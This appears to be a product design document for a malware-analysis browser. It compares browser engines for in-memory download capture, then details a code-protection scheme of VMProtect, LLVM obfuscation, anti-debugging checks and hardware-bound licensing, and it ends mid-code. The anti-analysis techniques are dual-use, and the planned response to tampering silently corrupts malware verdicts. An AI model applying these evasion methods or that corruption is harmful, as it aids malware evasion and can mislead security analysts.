# ShieldTier V2 — Custom Browser Engine

## Why V2 Exists

ShieldTier V1 is built on Electron, which wraps Chromium behind a simplified JavaScript API. Electron was designed for "web developers who want desktop apps" — it intentionally **hides** Chromium's power. For a SOC malware analysis browser, this is the bottleneck.

### The Pain Points That Drove This Decision

1. **`will-download` is crippled** — Electron's download API has NO way to stream bytes into memory. It only notifies that a download started, then writes to disk.
2. **`net.request()` re-download fails for POST/CSRF** — MalwareBazaar and similar sites use POST + CSRF tokens. A bare GET re-download gets HTML error pages.
3. **`Network.getResponseBody` unreliable** — Chrome may discard download response bodies after writing to disk. CDP cache misses are common.
4. **Temp files violate isolation** — Writing malware to disk (even briefly) risks AV quarantine, Spotlight indexing, and crash-leaving-file-on-disk scenarios.
5. **`session.webRequest` has NO body access** — Explicitly requested in Electron issue #36261 and rejected by maintainers.
6. **BrowserView sandbox limits** — `nodeIntegration: false`, `contextIsolation: true`, `sandbox: true` — cannot inject scripts to capture data.

### The Abstraction Problem

```
Current Stack (V1 — 3 layers of abstraction):

  Our Code (TypeScript)
      │
  Electron (JavaScript wrapper)          <── THE BOTTLENECK
      │
  Chromium (C++ — has everything we need)
      │
  Network Stack, Renderer, V8, Download Manager
```

Chromium has native APIs for everything we need. Electron just won't expose them.

---

## V1 Interim Fix: CDP Fetch Gateway (Shipped)

Before building V2, we shipped a CDP Fetch domain workaround in V1:

- `src/main/fileanalysis/fetch-gateway.ts` — Intercepts ALL HTTP responses via `Fetch.requestPaused`
- Downloads detected by Content-Disposition / MIME type / URL extension
- Body captured via `Fetch.getResponseBody` (original response — works for POST/CSRF/auth)
- Download killed via `Fetch.failRequest` before `will-download` fires
- `will-download` kept as safety net only

**This works but has limitations:**
- `Fetch.getResponseBody` loads ENTIRE body as base64 string (~33% memory overhead)
- 100MB file needs ~133MB in memory during transfer
- No streaming for large files (10GB+ would OOM)
- Known Electron CDP bugs (issues #23594, #27768, #37491, #46048)
- Blob/data URLs bypass Fetch domain entirely
- Service Workers may bypass Fetch domain

---

## V2 Architecture: Two Realistic Paths

### Path A: CEF (Chromium Embedded Framework) — "The Smart Path" (RECOMMENDED)

Replace Electron's browser shell with CEF while keeping ALL existing analysis code.

```
ShieldTier V2 Architecture
├── C++ Shell (CEF integration)
│   ├── CefBrowserHost          (replaces BrowserView)
│   ├── CefResponseFilter       (replaces CDP Fetch hacks)
│   ├── CefDownloadHandler      (replaces will-download)
│   ├── CefRequestHandler       (replaces network policy hacks)
│   ├── CefCookieManager        (replaces session partitions)
│   └── CefResourceRequestHandler (replaces net.request workarounds)
│
├── Node.js Analysis Engine (child process — ALL existing code)
│   ├── PE Capability Analyzer      ← already built
│   ├── Script Detonation Chamber   ← already built
│   ├── Shellcode Emulator          ← already built
│   ├── YARA Engine (24 rules)      ← already built
│   ├── Heap Forensics              ← already built
│   ├── Static Analyzers (PE/PDF/Office/General) ← already built
│   ├── Hash Enrichment (VT/AbuseIPDB/OTX/URLhaus/WHOIS) ← already built
│   ├── Sandbox Submission (HA/Joe/Cuckoo) ← already built
│   ├── Email Analysis              ← already built
│   └── Config/Export/VPN           ← already built
│
└── UI Layer (two options)
    ├── Option 1: Qt/Cocoa native UI (maximum performance)
    └── Option 2: CEF renders our React UI too (browser-in-browser, less rewrite)
```

#### What CEF Gives Us

| CEF Component | What It Does | ShieldTier Use Case |
|---------------|-------------|---------------------|
| `CefResponseFilter` | Stream-intercept ANY response body byte-by-byte | Capture downloads in memory (streaming, no OOM) |
| `CefRequestHandler` | Intercept/block/modify ANY request before it sends | Block malicious outbound connections |
| `CefDownloadHandler` | Full download lifecycle — before, during, after | Total control, no `will-download` hack |
| `CefCookieManager` | Per-session cookie isolation | Proper isolation (not partition hacks) |
| `CefResourceRequestHandler` | Per-request headers, auth, redirects | No more `net.request()` workarounds |
| Content API | Direct access to renderer process | Deep DOM/JS inspection |

#### How CefResponseFilter Works

```cpp
// CefResponseFilter::Filter() — receives response body in chunks
FilterStatus Filter(void* data_in, size_t data_in_size, size_t& data_in_read,
                    void* data_out, size_t data_out_size, size_t& data_out_written) {
    // Read all bytes into memory (accumulate chunks)
    // Hash, scan, quarantine — all in-memory
    // Return RESPONSE_FILTER_NEED_MORE_DATA to keep receiving
    // Return RESPONSE_FILTER_DONE when finished
}
```

This gives byte-by-byte streaming access — a 10GB file can be hashed incrementally without buffering the whole thing.

#### CEF Integration Approach

**Option 1: Full Replacement** (recommended for V2)
- Replace Electron entirely with CEF C++ shell
- Node.js analysis engine runs as child process
- IPC via stdin/stdout JSON protocol or Unix domain sockets
- UI via CEF rendering our React frontend (browser-in-browser)

**Option 2: Native Addon** (hybrid, higher complexity)
- Keep Electron for UI
- Build native N-API addon that spawns CEF window
- Two Chromium instances (complex, but keeps existing UI code)
- IPC between Electron main process and CEF addon

#### Build System

```bash
# CEF SDK download
wget https://cef-builds.spotifycdn.com/cef_binary_<version>_<platform>.tar.bz2

# Build with CMake
cmake -G "Ninja" -DCEF_ROOT=/path/to/cef ..
ninja

# CEF SDK includes:
#   - libcef.so / Chromium Embedded Framework.framework
#   - C++ wrapper library
#   - Header files
#   - Sample applications (cefsimple, cefclient)
```

#### Estimated Effort

| Phase | Work | Time |
|-------|------|------|
| CEF shell (basic browser window) | C++ app with CefBrowserHost, navigation, tabs | 1 week |
| Response interception | CefResponseFilter + CefDownloadHandler | 3-4 days |
| Node.js IPC bridge | JSON protocol over stdin/stdout | 2-3 days |
| Network policy | CefRequestHandler (block private IPs, WebRTC, etc.) | 2-3 days |
| UI integration | CEF renders React UI or Qt/Cocoa native | 1-2 weeks |
| Session isolation | Per-tab CefCookieManager + request contexts | 3-4 days |
| Testing + polish | End-to-end testing with malware samples | 1 week |
| **Total** | | **~4-6 weeks** |

---

### Path B: Raw Chromium Content API — "Maximum Control"

Fork Chromium's `content_shell`, strip everything not needed, add custom hooks directly into Chromium's network stack.

```
Chromium Fork
├── content/ (browser shell)
│   ├── Custom download manager (intercepts at URLLoaderFactory level)
│   ├── Custom network observer (raw response bodies)
│   └── Custom content client (security policy enforcement)
│
├── Our custom patches
│   ├── network::URLLoaderFactory interceptor
│   ├── content::DownloadManagerDelegate override
│   └── Custom IPC to Node.js analysis engine
│
└── Build with GN/Ninja (Chromium build system)
```

#### Pros
- Maximum possible control — we ARE the browser
- Smallest binary (strip everything not needed)
- No third-party dependency (we own the source)
- Can patch Chromium bugs directly

#### Cons
- Chromium checkout: **~30GB** source, **100GB+** with build artifacts
- Build time: **4-8 hours** on fast hardware
- GN/Ninja build system learning curve
- Must track Chromium upstream releases (security patches)
- Massive ongoing maintenance burden

#### Realistic Only If
- ShieldTier becomes a product with a dedicated engineering team
- Long-term browser differentiation is a competitive advantage
- Custom TLS/network stack modifications are needed

**Verdict: Not recommended for current stage. CEF gives 95% of the benefit at 10% of the cost.**

---

## Engines Evaluated and Rejected

### Ladybird (LibWeb)

| Aspect | Status |
|--------|--------|
| Maturity | Pre-alpha |
| Embedding API | None (standalone browser only) |
| Response interception | No documented API |
| Download handling | Not implemented |
| Alpha release | Targeted 2026 |
| Beta | 2027 |
| Stable | 2028 |
| License | BSD 2-Clause |

**Verdict: Years from production. No embedding API. Would require forking entire project.**

### Servo (Mozilla's Experimental Engine)

| Aspect | Status |
|--------|--------|
| Version | 0.0.4 |
| Language | Rust |
| Embedding | ~250 lines of Rust, API rapidly changing |
| Response interception | `WebViewDelegate::load_web_resource` + `intercept()` (experimental) |
| Download handling | No `notify_download_started` method |
| Node.js integration | Rust FFI + N-API bindings required |
| License | MPL 2.0 |

**Verdict: Too experimental. Rapidly changing API. No download support. Rust FFI complexity.**

### WebKit (WKWebView / WebKitGTK)

| Aspect | Status |
|--------|--------|
| WKURLSchemeHandler | Custom schemes only — NOT http/https |
| POST bodies | Broken until iOS 13 |
| Electron integration | Impossible (Electron IS Chromium) |
| Platform | macOS/iOS only (WKWebView), Linux only (WebKitGTK) |
| License | LGPL/Proprietary |

**Verdict: Cannot intercept standard HTTP/HTTPS traffic. Cannot embed in Electron. Platform-locked.**

---

## Comparison Matrix

| Approach | Maturity | Language | In-Memory Body | Streaming | Downloads | Integration | License |
|----------|----------|----------|----------------|-----------|-----------|-------------|---------|
| **CEF CefResponseFilter** | Production (17yr) | C++ | YES | YES (byte-by-byte) | YES | Replace Electron | BSD 3-Clause |
| **Raw Chromium Fork** | Production | C++ | YES | YES | YES | Full rewrite | BSD 3-Clause |
| **CDP Fetch (V1 fix)** | Moderate (bugs) | JS | YES | NO (full buffer) | YES (workarounds) | Already in Electron | N/A |
| **Ladybird/LibWeb** | Pre-alpha | C++ | NO API | NO | NO | No embedding | BSD 2-Clause |
| **Servo** | Experimental | Rust | PARTIAL | Unknown | NO | Rust FFI | MPL 2.0 |
| **WebKit** | Production | Obj-C/C++ | Custom schemes only | N/A | Limited | Cannot embed | LGPL |
| **MITM Proxy (mockttp)** | Production | TypeScript | YES | YES (chunked) | YES | Medium | Apache 2.0 |
| **mitmproxy** | Production | Python | YES | YES | YES | External process | MIT |

### CDP Fetch (V1) vs CEF (V2) Direct Comparison

| Capability | CDP Fetch (V1) | CEF (V2) |
|------------|----------------|----------|
| Language | TypeScript | C++ |
| Body capture | Yes | Yes |
| Download control | Yes | Yes |
| **Streaming body** | **No (full buffer only)** | **Yes (byte-by-byte)** |
| **10GB+ file capture** | **OOM risk** | **Streaming, no OOM** |
| Build complexity | `npm run build` | CMake + CEF SDK |
| Time to ship | 1 day (done) | 4-6 weeks |
| Dependency | Electron | CEF (still Chromium under the hood) |
| Memory overhead | ~33% (base64) | Zero (raw bytes) |
| Known bugs | Electron #23594, #27768, #37491, #46048 | Mature, 17yr track record |
| Blob/data URL support | No | Yes |
| Service Worker bypass | Possible | No (intercepts at network layer) |

---

## Known CDP Fetch Bugs (Why V2 Is Needed)

These are Electron-specific issues that motivate moving away from CDP hacks:

1. **Issue #23594** — `Fetch.getResponseBody` callbacks never fired. Fix: use `await` (Promise-based). Status: workaround.

2. **Issue #27768** — CDP Fetch with auto-attached targets crashes in Electron 12.x. Iframes stop loading in 11.x. Workaround: attach debugger to individual webviews. Status: WONTFIX.

3. **Issue #37491** — `webContents.debugger` fails to retrieve response body intermittently. "No resource with given identifier found." Regression since Electron 9. Status: WONTFIX.

4. **Issue #46048** — CDP event dispatching issues in Electron 35+. `Page.frameAttached` events not firing.

5. **Issue #36261** — Feature request for WebRequest API to read response body. Maintainer said: "We cannot simply reuse the implementation, as it simply copies the whole response body to a buffer which will not work for requests that have very large response body." Status: WONTFIX.

6. **Playwright Issue #6573** — Enabling Fetch domain interception causes downloads to be **canceled** in Chromium. Download-attribute links (`<a download>`) arrive without `networkId`.

7. **Large file OOM** — `Fetch.getResponseBody` loads ENTIRE body as base64 string. 100MB file = ~133MB in memory. No streaming alternative that preserves `continueResponse`.

8. **After `takeResponseBodyAsStream`** — The request CANNOT be continued as-is. Must cancel or provide body via `fulfillRequest`. This breaks transparent pass-through.

---

## Tier Strategy (Roadmap)

### Tier 1: CDP Fetch (DONE — V1)
- `fetch-gateway.ts` — Response-stage interception
- `interceptor.ts` — Thin coordinator, `will-download` safety net
- Ships now, handles 90%+ of download scenarios
- Known limitations for large files, blob URLs, service workers

### Tier 2: Hybrid CDP + MITM Proxy (Optional Intermediate)
- Add `mockttp` (Node.js) as local proxy alongside CDP Fetch
- Triple-layer interception: CDP Fetch primary + MITM proxy + `will-download` safety net
- Handles 99%+ of scenarios including service workers
- Still within Electron — no C++ needed
- Estimated effort: 1-2 weeks

### Tier 3: CEF Custom Browser (V2)
- Replace Electron shell with CEF
- Keep ALL analysis code in Node.js child process
- Native streaming response interception
- No more CDP hacks, no more Electron limitations
- Production-grade browser embedding (Spotify, Steam, OBS use CEF)
- Estimated effort: 4-6 weeks

---

## What We Keep From V1

ALL analysis code transfers directly to V2 as a Node.js child process:

| Subsystem | File(s) | Status |
|-----------|---------|--------|
| PE Capability Analyzer | `src/main/advanced/pe-capability/` | Built |
| Script Detonation Chamber | `src/main/advanced/script-detonation/` | Built |
| Shellcode Emulator | `src/main/advanced/shellcode-emulator/` | Built |
| Heap Forensics | `src/main/advanced/heap-forensics/` | Built |
| DNS/Network Analysis | `src/main/advanced/dns-network/` | Built |
| WASM Inspector | `src/main/advanced/wasm-inspector/` | Built |
| YARA Engine (24 rules) | `src/main/yara/` | Built |
| Static Analyzers | `src/main/fileanalysis/analyzers/` | Built |
| Hash Enrichment (5 providers) | `src/main/enrichment/` | Built |
| Sandbox Submission (4 providers) | `src/main/fileanalysis/sandbox/` | Built |
| Email Analysis | `src/main/emailanalysis/` | Built |
| Inline Behavioral Sandbox | `src/main/sandbox/` | Built |
| Network Capture (HAR/PCAP) | `src/main/capture/` | Built |
| VPN Integration (4 providers) | `src/main/vpn/` | Built |
| Config Store (encrypted) | `src/main/config/` | Built |
| Export (HTML/JSON/ZIP) | `src/main/export/` | Built |
| React UI | `src/renderer/` | Built (reusable if CEF renders React) |

**Nothing is thrown away.** V2 is a shell replacement, not a rewrite.

---

## Security Model (V2 Improvements)

| Feature | V1 (Electron) | V2 (CEF) |
|---------|---------------|----------|
| Sandbox isolation | BrowserView sandbox flags | CEF process isolation (separate renderer process) |
| Network policy | `session.webRequest` header-only | `CefRequestHandler` full request/response control |
| Download interception | CDP Fetch (hacky) | `CefResponseFilter` (native streaming) |
| Cookie isolation | Partition strings | `CefCookieManager` per-context |
| Certificate control | `certificate-error` event | `CefRequestHandler::OnCertificateError` |
| Content injection | Not possible (sandbox) | `CefRenderProcessHandler` (controlled injection) |

---

---

# Source Code Protection — Zero-Compromise Architecture

## Why V1's Protection Is Broken

ShieldTier V1 uses **Bytenode** to compile main/preload JavaScript to V8 bytecode (`.jsc`). This is now **security theater**.

### The Tools That Killed Bytenode

**View8** (Check Point Research, 2024): A static analysis tool that decompiles `.jsc` files back to **readable JavaScript**. Successfully decompiled thousands of V8-compiled files, extracting C2 configs, encryption keys, and full business logic. The tool auto-detects V8 versions and supports both Node.js and Electron bytecode.

**Ghidra NodeJS Plugin** (PT SWARM / Positive Technologies): A full Ghidra processor module that parses, disassembles, and decompiles `.jsc` binaries into C-like pseudocode. Implements V8's ~170 opcodes in SLEIGH with dynamic p-code injection.

### What V8 Bytecode Preserves (Everything)

| Data | Preserved? | Impact |
|------|-----------|--------|
| String constants | YES — in constant pool, verbatim | API endpoints, error messages, URLs all exposed |
| Variable names | YES — through scope info objects | Full readability of decompiled code |
| Function structure | YES — boundaries, args, scope chains | Complete program structure recoverable |
| Control flow | YES — ~170 opcodes map ~1:1 to JS | Logic fully reconstructable |
| Comments | NO | Irrelevant — comments aren't code |
| Whitespace | NO | Irrelevant — formatter fixes this |

**Bottom line**: View8 + Ghidra plugin = anyone can read our `.jsc` files as if they were source code. Bytenode is NOT protection.

### What Commercial Apps Actually Do

| App | Architecture | Protection Level |
|-----|-------------|-----------------|
| **1Password** | Rust core (crypto, vault, auth) + Electron UI shell | **VERY HIGH** |
| **Figma** | C++ rendering engine → WASM + React shell | **HIGH** |
| **Obsidian** | Bytenode (.jsc) | **LOW** — View8 breaks it |
| **Discord** | Minified JS, no protection | **LOW** — accepts client is untrusted |
| **Slack** | Webpack-bundled, minified JS | **LOW** |
| **Notion** | Webpack + obfuscation | **LOW-MEDIUM** |

**Pattern**: Every app that takes protection seriously **moves the core to native code**. Everything else is a speed bump.

---

## V2 Protection Architecture: 5 Layers

```
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 5: Server-Side Crown Jewels (unreachable)               │
│  Proprietary YARA rules, ML models, threat intel scoring       │
│  Runs on ShieldTier Cloud (Hetzner) — never ships to client    │
├─────────────────────────────────────────────────────────────────┤
│  LAYER 4: Encrypted Rule Delivery (cloud → client)             │
│  AES-256-GCM encrypted rule packages, time-limited,            │
│  license-bound decryption key, decrypted in-memory only        │
├─────────────────────────────────────────────────────────────────┤
│  LAYER 3: Native C++ Binary (CEF Shell + Analysis Core)        │
│  VMProtect virtualization on critical functions                 │
│  LLVM obfuscation (CFF + MBA) on remaining code                │
│  Anti-debug mesh, integrity guards, encrypted code pages       │
├─────────────────────────────────────────────────────────────────┤
│  LAYER 2: Hardware-Bound Licensing                             │
│  Secure Enclave (macOS) / DPAPI (Win) / Secret Service (Linux) │
│  Machine fingerprint, signed license blob, online activation   │
├─────────────────────────────────────────────────────────────────┤
│  LAYER 1: Code Attestation + Integrity                         │
│  Self-hashing of all binaries, signature verification,         │
│  silent corruption on tamper (not crash — attacker doesn't     │
│  know which check failed)                                      │
└─────────────────────────────────────────────────────────────────┘
```

### Deployment Model

- **First install**: Pulls encrypted rule packages + ML models from ShieldTier Cloud (same pattern as VM image download)
- **After install**: Fully local operation — all analysis works offline with cached encrypted rules
- **Exception**: Chat relays through ShieldTier web services (already built in V1 Phase 14)
- **Periodic**: Heartbeat every 24h for license validation + rule refresh. 30-day offline grace period.

---

## Layer 1: Code Attestation & Integrity

### Purpose

Detect and respond to binary patching, debugging, and tampering.

### Self-Hashing

Build pipeline computes SHA-256 of every code section and embeds expected hashes in a read-only data segment:

```cpp
// At build time: hash every code section
// At runtime: watchdog thread re-hashes periodically

static const uint8_t expected_text_hash[32] = { /* build-time computed */ };

void verify_code_integrity() {
    uint8_t* text_start = find_text_section(get_module_base());
    size_t text_size = get_text_section_size(get_module_base());

    uint8_t actual_hash[32];
    sha256(text_start, text_size, actual_hash);

    if (memcmp(actual_hash, expected_text_hash, 32) != 0) {
        // CRITICAL: Do NOT crash — silently corrupt crypto keys.
        // App appears to work but produces garbage analysis results.
        // Attacker wastes hours before realizing protection triggered.
        global_rule_decryption_key ^= 0xFFFFFFFFFFFFFFFF;
    }
}
```

### Integrity Guard Mesh

Guards are interconnected: Guard A checks Guard B's code, Guard B checks Guard C, Guard C checks Guard A. Patching any single guard or its target breaks the entire chain. Inspired by Arxan/Digital.ai Application Protection.

### Silent Corruption Response

**Never crash on tamper detection.** Instead:
- Corrupt cryptographic keys → encrypted rules won't decrypt properly
- Inject subtle errors into analysis results → wrong verdicts, missing findings
- Delay the failure → attacker patches something, runs a test, gets "correct" results, then 15 minutes later the corruption kicks in
- The goal: make the attacker unable to determine WHICH check they failed and WHEN

---

## Layer 2: Hardware-Bound Licensing

### Machine Fingerprint (5-factor, fuzzy matching)

```cpp
struct MachineFingerprint {
    std::string cpu_id;          // macOS: sysctl machdep.cpu.brand_string
                                 // Win: wmic cpu get ProcessorId
                                 // Linux: /proc/cpuinfo model name

    std::string board_serial;    // macOS: ioreg IOPlatformSerialNumber
                                 // Win: wmic baseboard get SerialNumber
                                 // Linux: /sys/class/dmi/id/board_serial

    std::string disk_serial;     // macOS: diskutil info disk0 UUID
                                 // Win: wmic diskdrive get SerialNumber
                                 // Linux: lsblk -o SERIAL

    std::string mac_address;     // First non-virtual, non-loopback interface

    std::string os_install_id;   // macOS: ioreg IOPlatformUUID
                                 // Win: wmic csproduct get UUID
                                 // Linux: /etc/machine-id
};

// Fuzzy matching: 3-of-5 components must match.
// Handles hardware upgrades gracefully.
```

### License Blob (signed by server)

```cpp
struct LicenseBlob {
    std::string license_id;
    std::string tier;               // "free" | "pro" | "team" | "enterprise"
    std::vector<std::string> features;
    std::string machine_fingerprint; // SHA-256 of fingerprint components
    int64_t issued_at;
    int64_t expires_at;
    int max_offline_days;            // 30 days
    std::string signature;           // Ed25519 signature by license server
};
```

### Key Storage

| Platform | Mechanism | Security |
|----------|-----------|----------|
| **macOS** | Secure Enclave via Keychain | Key physically cannot be extracted from hardware. Requires biometric (Touch ID). |
| **Windows** | DPAPI | Encrypted with user's Windows credentials. Requires login session. |
| **Linux** | Secret Service API (GNOME Keyring / KDE Wallet) | Encrypted at rest, decrypted per-session. |

### Activation Flow

```
1. User enters license key in ShieldTier
2. App generates machine fingerprint (5 components)
3. App sends {license_key, fingerprint} to ShieldTier Cloud
4. Server verifies key, binds to fingerprint, returns signed LicenseBlob
5. App stores encrypted LicenseBlob locally via OS keychain
6. App stores license decryption key in Secure Enclave (macOS) / DPAPI (Win)
7. Heartbeat: every 24h, POST /license/validate {license_id, fingerprint, version}
8. Server returns signed token (valid 48h) — required for rule downloads
9. Offline grace: 30 days without server contact before premium features degrade
```

---

## Layer 3: Native C++ Binary (The Core Defense)

This is the fundamental architectural change. Instead of JavaScript that View8 decompiles in seconds, **ALL analysis logic compiles to native machine code**.

### 3A: Port ALL Analysis Logic to C++

**Nothing stays in JavaScript except the React UI** (which is just layout — zero detection logic).

| V1 (TypeScript — View8 reversible) | V2 (C++ — native binary) |
|-------------------------------------|--------------------------|
| `src/main/yara/scanner.ts` | `src/native/yara/scanner.cpp` — uses libyara C library directly |
| `src/main/yara/parser.ts` | Eliminated — libyara handles parsing natively |
| `src/main/sandbox/engine.ts` | `src/native/sandbox/engine.cpp` |
| `src/main/sandbox/signatures.ts` | `src/native/sandbox/signatures.cpp` |
| `src/main/sandbox/network-profiler.ts` | `src/native/sandbox/network_profiler.cpp` |
| `src/main/sandbox/script-analyzer.ts` | `src/native/sandbox/script_analyzer.cpp` |
| `src/main/sandbox/collector.ts` | `src/native/sandbox/collector.cpp` |
| `src/main/enrichment/manager.ts` | `src/native/enrichment/manager.cpp` (HTTP via libcurl) |
| `src/main/enrichment/providers/*.ts` | `src/native/enrichment/providers/*.cpp` |
| `src/main/enrichment/extractors.ts` | `src/native/enrichment/extractors.cpp` |
| `src/main/fileanalysis/manager.ts` | `src/native/fileanalysis/manager.cpp` |
| `src/main/fileanalysis/analyzers/*.ts` | `src/native/fileanalysis/analyzers/*.cpp` (PE via pe-parse) |
| `src/main/fileanalysis/fetch-gateway.ts` | Eliminated — CefResponseFilter replaces it |
| `src/main/fileanalysis/interceptor.ts` | Eliminated — CefDownloadHandler replaces it |
| `src/main/advanced/pe-capability/*.ts` | `src/native/advanced/pe_capability/*.cpp` |
| `src/main/advanced/script-detonation/*.ts` | `src/native/advanced/script_detonation/*.cpp` |
| `src/main/advanced/shellcode-emulator/*.ts` | `src/native/advanced/shellcode_emulator/*.cpp` |
| `src/main/advanced/heap-forensics/*.ts` | `src/native/advanced/heap_forensics/*.cpp` |
| `src/main/advanced/dns-network/*.ts` | `src/native/advanced/dns_network/*.cpp` |
| `src/main/advanced/wasm-inspector/*.ts` | `src/native/advanced/wasm_inspector/*.cpp` |
| `src/main/advanced/inetsim/*.ts` | `src/native/advanced/inetsim/*.cpp` |
| `src/main/advanced/artifactql/*.ts` | `src/native/advanced/artifactql/*.cpp` |
| `src/main/emailanalysis/*.ts` | `src/native/email/*.cpp` |
| `src/main/capture/manager.ts` | `src/native/capture/manager.cpp` (CDP via CEF native API) |
| `src/main/capture/har-builder.ts` | `src/native/capture/har_builder.cpp` |
| `src/main/capture/session.ts` | `src/native/capture/session.cpp` |
| `src/main/contentanalysis/*.ts` | `src/native/content/*.cpp` |
| `src/main/export/*.ts` | `src/native/export/*.cpp` |
| `src/main/config/store.ts` | `src/native/config/store.cpp` |
| `src/main/network/policy.ts` | `src/native/network/policy.cpp` |
| `src/main/threatfeed/*.ts` | `src/native/threatfeed/*.cpp` |
| `src/main/loganalysis/*.ts` | `src/native/loganalysis/*.cpp` |
| `src/main/vm/*.ts` | `src/native/vm/*.cpp` |
| `src/main/tabs.ts` | `src/native/session/manager.cpp` (CEF CefBrowserHost replaces BrowserView) |
| `src/main/auth/manager.ts` | `src/native/auth/manager.cpp` |
| `src/main/session-chat/*.ts` | `src/native/chat/*.cpp` (libsodium for ShieldCrypt) |
| Scoring algorithms (scattered) | `src/native/scoring/engine.cpp` — consolidated, VMProtect-protected |

**Native library dependencies** (replacing npm packages):

| V1 npm Package | V2 C/C++ Library |
|---------------|------------------|
| `pe-library` | pe-parse (C++, MIT) |
| `node-forge` | OpenSSL / BoringSSL (bundled with CEF) |
| `libsodium-wrappers` | libsodium (C, ISC) |
| `protobufjs` | protobuf (C++, Google) |
| `wabt` | wabt (C++, Apache 2.0) |
| `node-7z` + `7zip-bin` | libarchive (C, BSD) or 7zip SDK (C, LGPL) |
| Custom JS YARA parser | libyara (C, BSD 3-Clause) — the REAL YARA engine |

### 3B: VMProtect Virtualization (Critical Functions)

VMProtect converts native x86/x64 instructions into a **proprietary bytecode** running on a **custom virtual machine** embedded in the binary.

#### How VMProtect Works Technically

```
Original x86 code
     │
     ▼
Disassemble → Lift to IR → Transform to VM bytecode
     │
     ▼
Embed custom VM interpreter + bytecode into binary

Runtime: VM dispatch loop executes virtual instructions
         Opcode encoding is RANDOMIZED per build
         Handler functions are MUTATED (junk code, equivalent substitutions)
         No generic decompiler exists
```

**Dispatch loop (simplified):**
```cpp
while (true) {
    uint8_t opcode = *virtual_ip++;
    handler_table[opcode](vm_context);  // Each handler is uniquely generated
}
```

**What makes it hard to reverse:**
- Each build gets UNIQUE opcode-to-handler mapping (randomized)
- Handler functions contain junk instructions, equivalent substitutions, opaque predicates
- Multiple VM architectures per binary (different functions use different VMs)
- Ultra mode: each instruction becomes multiple VM instructions (5-20x inflation)
- Anti-tracing checks inline within the VM interpreter
- Manual devirtualization of ONE function takes **days to weeks** for skilled RE

**Performance overhead**: 10-50x slower. Only suitable for security-critical code, NOT hot loops.

#### What We Virtualize

| Function | Why |
|----------|-----|
| `license_validate()` | Prevents license bypass |
| `threat_score_compute()` | Core scoring algorithm — our competitive advantage |
| `yara_match_core()` | Inner matching loop for proprietary rules |
| `signature_compare()` | Behavioral signature matching engine |
| `heuristic_decision_tree()` | Detection heuristic logic |
| `key_derive()` | Key derivation for rule decryption |
| `integrity_check_mesh()` | The integrity guards themselves |
| `anti_debug_dispatcher()` | Anti-debugging orchestration |

### 3C: LLVM Obfuscation (Everything Else)

All code NOT protected by VMProtect (too slow) gets compile-time obfuscation via LLVM passes. Build with `clang++` + Obfuscator-LLVM (O-LLVM) / Hikari / Pluto.

#### Control Flow Flattening (CFF)

Destroys the natural control flow graph. Converts structured code into a flat switch-dispatch loop:

```cpp
// BEFORE obfuscation:
if (condition_a) {
    block_a();
} else {
    block_b();
}
block_c();

// AFTER CFF:
int state = 0xA3F1;  // Computed dynamically, not constant
while (true) {
    switch (state) {
        case 0xA3F1: /* check condition */ state = condition_a ? 0x7B2C : 0x1D9E; break;
        case 0x7B2C: block_a(); state = 0x4F0A; break;
        case 0x1D9E: block_b(); state = 0x4F0A; break;
        case 0x4F0A: block_c(); state = 0xEEEE; break;
        case 0xEEEE: return;
    }
}
// State transitions can be encrypted: next_state = current_state ^ 0xDEAD + computed_value
```

IDA Pro's control flow recovery fails on this. Symbolic execution tools struggle when state encoding depends on runtime values.

#### Mixed Boolean Arithmetic (MBA)

Replaces simple operations with mathematically equivalent but impenetrable expressions:

```cpp
// Original:
result = x + y;

// After MBA:
result = 39*(x & y) - 41*(x ^ y) + 40*(x | y) + 40*(~x & y);

// After recursive MBA (depth 3):
// ... 200+ characters of nested expressions that simplify to x + y
// z3 SMT solver can verify equivalence but cannot efficiently simplify back
```

#### Bogus Control Flow (BCF)

Inserts fake conditional branches with opaque predicates:

```cpp
// Algebraic opaque predicate: (x * (x - 1)) % 2 == 0 is ALWAYS true for any integer
if ((x * (x - 1)) % 2 == 0) {
    real_code();           // Always executes
} else {
    fake_but_plausible();  // Dead code — looks real, references real variables
}
```

Advanced predicates: hash-based (`sha256(constant) == known_hash`), pointer-based (`&global != NULL`), environmental (`getpid() > 0`).

#### String Encryption

All string literals encrypted at compile time. Each string gets a unique decryption stub:

```cpp
// Build time: "api.shieldtier.com" → encrypted blob + decryptor function
// Runtime: decrypt_string_0x4F2A() returns the plaintext, then optionally re-encrypts after use
// `strings` binary finds nothing readable
```

#### Indirect Function Calls

Direct calls replaced with encrypted function pointer tables. `call analyze_pe()` becomes `call [encrypted_table[idx] ^ runtime_key]`. Defeats static call graph analysis.

#### Build Integration

```bash
# CMakeLists.txt uses O-LLVM/Hikari/Pluto passes
set(CMAKE_CXX_COMPILER "/path/to/obfuscator-llvm/bin/clang++")
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf")
# -fla = control flow flattening
# -sub = instruction substitution
# -bcf = bogus control flow
# -sobf = string obfuscation
```

### 3D: Anti-Debug Mesh

Multiple detection methods running concurrently across threads:

| Method | Platform | What It Detects |
|--------|----------|----------------|
| `ptrace(TRACEME)` self-trace | macOS/Linux | Any debugger attachment |
| Fork-based watchdog (child traces parent) | macOS/Linux | External tracer attachment |
| `mach_absolute_time()` timing checks | macOS | Single-stepping (instruction tracing) |
| Hardware breakpoint detection (DR0-DR3 via exception handler) | All | IDA/x64dbg/lldb hardware breakpoints |
| INT3 scanning (CRC32 of code sections) | All | Software breakpoints |
| Parent process name check | All | Launched from debugger (lldb, gdb, x64dbg) |
| `sysctl(CTL_KERN, KERN_PROC, KERN_PROC_PID)` | macOS | P_TRACED flag |
| `IsDebuggerPresent()` + `PEB.BeingDebugged` | Windows | User-mode debugger |
| `NtQueryInformationProcess(ProcessDebugPort)` | Windows | Debug port active |
| `NtQueryInformationProcess(ProcessDebugObjectHandle)` | Windows | Debug object exists |
| `PEB.NtGlobalFlag` heap debug flags check | Windows | Heap debug flags (0x70) |
| TLS callbacks (anti-debug before `main()`) | Windows | Debugger breaking at entry point |
| Thread execution time vs wall clock comparison | All | Emulation / VM execution |

**Response strategy**: Silent corruption, not crash. Multiple methods cross-validate — defeating one doesn't help if the other 11 are still active.

### 3E: Encrypted Code Pages with Lazy Decryption

Critical code sections encrypted at rest in the binary. Decrypted on-demand via page fault handler:

```cpp
// On-disk: each 4KB code page independently AES-256-GCM encrypted
// At runtime: pages decrypted on-demand via SIGSEGV/EXCEPTION handler
// After use: pages re-encrypted after 5-second idle timeout

struct EncryptedPage {
    uint8_t iv[16];
